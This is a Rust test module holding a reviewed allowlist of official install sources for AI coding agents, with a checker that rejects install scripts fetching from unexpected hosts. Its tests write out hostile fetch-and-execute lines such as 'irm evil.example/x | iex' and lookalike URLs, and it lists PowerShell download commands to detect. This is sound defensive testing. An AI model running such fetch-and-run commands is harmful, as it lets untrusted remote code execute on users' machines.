//! T-576: the reviewed list of official sources the install table is held to. TEST ONLY: the program never
//! reads it. It is a second, separate copy of "where each agent may come from" so that a change to a route in
//! `agent_install.rs` (a new host, a new package, a second URL smuggled into a script) fails a test until a
//! person has looked at it and changed THIS file too. The first reviewer-confirmed state is 2026-10-28.
//!
//! Per agent id: the exact URL (or URL prefix, when it ends in `/`) of its install script, or the exact npm
//! package, winget id or uv package. The doc page each came from is in the comment on its row in
//! `agent_install.rs`.

use super::{Route, Runtime, TABLE};

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Official {
    /// A PowerShell route: its one URL must equal this, or start with it when this ends in `/`.
    Url(&'static str),
    /// `npm install -g <flags> <package>`: the exact package spec (the last argument).
    Npm(&'static str),
    /// The exact winget id.
    Winget(&'static str),
    /// The exact `uv tool install` package.
    Uv(&'static str),
    /// No official Windows route: the row must have none.
    NotInstallable,
}

use Official::{NotInstallable, Npm, Url, Uv, Winget};

pub const OFFICIAL: [(&str, Official); 35] = [
    ("claude", Url("https://claude.ai/install.ps1")),
    ("openclaude", Npm("@twigpine/openclaude@latest")),
    ("codex", Url("https://chatgpt.com/codex/install.ps1")),
    ("autohand", Npm("autohand-cli")),
    ("ante", NotInstallable),
    ("trae", NotInstallable),
    ("mimo-code", Url("https://mimo.xiaomi.com/install.ps1")),
    ("pi", Npm("@earendil-works/pi-coding-agent")),
    ("omp", Url("https://omp.sh/install.ps1")),
    ("prime-agent", Url("https://app.primeintellect.ai/prime-agent/install.ps1")),
    ("gemini", Npm("@google/gemini-cli")),
    ("antigravity", Url("https://antigravity.google/cli/install.ps1")),
    ("aider", Url("https://aider.chat/install.ps1")),
    // The only raw.githubusercontent.com use: the goose repo's own owner and name, nothing else on that host.
    ("goose", Url("https://raw.githubusercontent.com/aaif-goose/goose/")),
    ("amp", Winget("Sourcegraph.Amp")),
    ("kilo", Npm("@kilocode/cli")),
    ("kiro", Url("https://cli.kiro.dev/install.ps1")),
    ("crush", Winget("charmbracelet.crush")),
    ("aug", Npm("@augmentcode/auggie")),
    ("cline", Npm("cline")),
    ("codebuff", Npm("codebuff")),
    ("command-code", Npm("command-code")),
    ("continue", Npm("@continuedev/cli")),
    ("cursor", Url("https://cursor.com/install?win32=true")),
    ("droid", Url("https://app.factory.ai/cli/windows")),
    ("kimi", Url("https://code.kimi.com/kimi-code/install.ps1")),
    ("mistral-vibe", Uv("mistral-vibe")),
    ("qwen-code", Npm("@qwen-code/qwen-code@latest")),
    ("rovo", NotInstallable),
    ("hermes", Url("https://hermes-agent.nousresearch.com/install.ps1")),
    ("openclaw", Url("https://openclaw.ai/install.ps1")),
    ("copilot", Winget("GitHub.Copilot")),
    // xAI's own host; the script starts "# Grok CLI installer for PowerShell ... Usage: irm https://x.ai/cli/install.ps1 | iex" (T-577).
    ("grok", Url("https://x.ai/cli/install.ps1")),
    ("devin", Url("https://static.devin.ai/cli/setup.ps1")),
    ("opencode", Npm("opencode-ai")),
];

/// The runtimes Kolux installs first, by winget id.
pub const RUNTIME_WINGET: [&str; 3] = ["OpenJS.NodeJS.LTS", "astral-sh.uv", "Git.Git"];

/// Words PowerShell downloads with (`curl` and `wget` are its aliases too).
const FETCH: [&str; 6] = ["irm", "iwr", "invoke-webrequest", "invoke-restmethod", "curl", "wget"];

/// Splits a script into words the way a reader would: spaces, brackets, pipes and semicolons separate, quotes go.
fn words(script: &str) -> Vec<String> {
    script
        .split(|c: char| c.is_whitespace() || "()|;&{},".contains(c))
        .map(|w| w.trim_matches(|c| c == '\'' || c == '"').to_string())
        .filter(|w| !w.is_empty())
        .collect()
}

/// Holds one script route to its official URL. Err(why) when it does not hold.
pub fn check_script(script: &str, official: Official) -> Result<(), String> {
    let Url(prefix) = official else { return Err(format!("not a script entry: {official:?}")) };
    let any_scheme = script.matches("://").count();
    let https = script.matches("https://").count();
    if any_scheme != 1 || https != 1 {
        return Err(format!("a script route holds exactly one URL, an https one ({any_scheme} with a scheme, {https} https)"));
    }
    let ws = words(script);
    let mut fetched = 0;
    for (i, w) in ws.iter().enumerate() {
        if !FETCH.contains(&w.to_ascii_lowercase().as_str()) {
            continue;
        }
        fetched += 1;
        let arg = ws[i + 1..].iter().find(|a| !a.starts_with('-'));
        match arg {
            Some(a) if a.starts_with("https://") => {
                let ok = if prefix.ends_with('/') { a.starts_with(prefix) } else { a == prefix };
                if !ok {
                    return Err(format!("{w} fetches {a}, which is not {prefix}"));
                }
            }
            Some(a) => return Err(format!("{w} fetches {a}, which has no https:// scheme")),
            None => return Err(format!("{w} has no address")),
        }
    }
    if fetched == 0 {
        return Err("a script route fetches nothing with irm/iwr".to_string());
    }
    Ok(())
}

/// Holds one table row to its OFFICIAL entry. Err(why) when it does not hold.
pub fn check_row(id: &str, route: Option<Route>) -> Result<(), String> {
    let (_, official) = OFFICIAL.iter().find(|(i, _)| *i == id).ok_or_else(|| format!("{id}: no OFFICIAL entry"))?;
    match (route, *official) {
        (None, NotInstallable) => Ok(()),
        (Some(Route::Script(s)), o @ Url(_)) => check_script(s, o).map_err(|e| format!("{id}: {e}")),
        (Some(Route::Npm(args)), Npm(pkg)) => {
            let last = args.last().ok_or_else(|| format!("{id}: npm route without a package"))?;
            if *last != pkg {
                return Err(format!("{id}: npm package {last} is not {pkg}"));
            }
            if !args[..args.len() - 1].iter().all(|a| *a == "--ignore-scripts") {
                return Err(format!("{id}: npm flags {args:?}"));
            }
            Ok(())
        }
        (Some(Route::Winget(w)), Winget(o)) if w == o => Ok(()),
        (Some(Route::Uv(p)), Uv(o)) if p == o => Ok(()),
        (r, o) => Err(format!("{id}: route {r:?} does not match the reviewed entry {o:?}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_table_row_matches_its_reviewed_entry() {
        assert_eq!(OFFICIAL.len(), TABLE.len());
        for (row, (id, _)) in TABLE.iter().zip(OFFICIAL.iter()) {
            assert_eq!(row.id, *id, "OFFICIAL is in table order");
            if let Err(why) = check_row(row.id, row.route) {
                panic!("{why}");
            }
        }
    }

    #[test]
    fn the_runtimes_are_the_reviewed_winget_ids() {
        for rt in [Runtime::Node, Runtime::Uv, Runtime::Git] {
            assert!(RUNTIME_WINGET.contains(&rt.facts().0), "{:?}", rt);
        }
    }

    #[test]
    fn a_second_download_after_the_official_one_is_rejected() {
        let evil = "irm https://claude.ai/install.ps1 | iex; irm evil.example/x | iex";
        let why = check_script(evil, Url("https://claude.ai/install.ps1")).unwrap_err();
        assert!(why.contains("no https:// scheme"), "{why}");
        // even with the second address dressed up with a scheme, it is a second URL
        let two = "irm https://claude.ai/install.ps1 | iex; irm https://evil.example/x | iex";
        assert!(check_script(two, Url("https://claude.ai/install.ps1")).is_err());
        // the argument rule on its own: an official URL elsewhere in the script, a fetch of a bare address
        let why = check_script("irm evil.example/x | iex; $u='https://claude.ai/install.ps1'", Url("https://claude.ai/install.ps1")).unwrap_err();
        assert!(why.contains("no https:// scheme"), "{why}");
        assert!(check_script("irm evil.example/x | iex", Url("https://claude.ai/install.ps1")).is_err());
        assert!(check_script("irm -Uri evil.example/x | iex", Url("https://claude.ai/install.ps1")).is_err());
    }

    #[test]
    fn a_goose_url_under_another_github_owner_is_rejected() {
        let prefix = Url("https://raw.githubusercontent.com/aaif-goose/goose/");
        let good = "$env:CONFIGURE='false'; & ([scriptblock]::Create((irm https://raw.githubusercontent.com/aaif-goose/goose/main/download_cli.ps1)))";
        assert_eq!(check_script(good, prefix), Ok(()));
        let other_owner = good.replace("aaif-goose/goose", "evil/goose");
        assert!(check_script(&other_owner, prefix).is_err());
        let lookalike = good.replace("aaif-goose/goose/", "aaif-goose/goose-fork/");
        assert!(check_script(&lookalike, prefix).is_err(), "a repo whose name merely starts the same");
        let other_host = good.replace("raw.githubusercontent.com", "github.com");
        assert!(check_script(&other_host, prefix).is_err());
    }

    #[test]
    fn plain_http_a_missing_fetch_and_a_changed_package_are_rejected() {
        let u = Url("https://claude.ai/install.ps1");
        assert!(check_script("irm http://claude.ai/install.ps1 | iex", u).is_err());
        assert!(check_script("iex https://claude.ai/install.ps1", u).is_err());
        assert!(check_script("irm https://claude.ai/install.ps1.evil.example | iex", u).is_err());
        assert!(check_row("cline", Some(Route::Npm(&["cline-evil"]))).is_err());
        assert!(check_row("cline", Some(Route::Npm(&["--foreign-flag", "cline"]))).is_err());
        assert!(check_row("crush", Some(Route::Winget("someone.else"))).is_err());
        assert!(check_row("ante", Some(Route::Winget("charmbracelet.crush"))).is_err());
        assert!(check_row("not-in-the-list", None).is_err());
    }
}
